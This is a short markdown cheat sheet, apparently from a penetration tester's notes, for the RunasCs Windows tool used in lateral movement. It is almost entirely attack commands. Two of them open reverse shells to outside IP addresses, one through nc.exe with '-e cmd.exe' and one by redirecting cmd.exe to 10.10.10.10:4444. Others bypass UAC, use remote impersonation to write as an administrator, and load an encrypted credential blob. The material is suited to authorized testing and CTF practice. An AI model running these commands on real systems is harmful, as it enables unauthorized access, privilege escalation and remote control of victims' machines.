---
tags:
  - tool
  - windows
  - lateral_movement
---
# RunasCs

Packaged Runas utility - [RunasCs](https://github.com/antonioCoco/RunasCs)

## Capabilities

```powershell
# Run a command as a local user
.\RunasCs.exe user1 password1 "cmd /c whoami /all"

# Run a command as a domain user and logon type as NetworkCleartext (8)
.\RunasCs.exe user1 password1 "cmd /c whoami /all" -d domain -l 8

# Run a background process as a local user,
.\RunasCs.exe user1 password1 "C:\Temp\nc.exe 10.10.14.82 9001 -e cmd.exe" -t 0

# Redirect stdin, stdout and stderr of the specified command to a remote host
.\RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444

# Run a command simulating the /netonly flag of runas.exe
.\RunasCs.exe user1 password1 "cmd /c whoami /all" -l 9

# Run a command as an Administrator bypassing UAC
.\RunasCs.exe adm1 password1 "cmd /c whoami /priv" --bypass-uac

# Run a command as an Administrator through remote impersonation
.\RunasCs.exe adm1 password1 "cmd /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation
```

If username or password is extremely long:

```
New-Variable -Name "pass" -Visibility Public -Value "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6"
```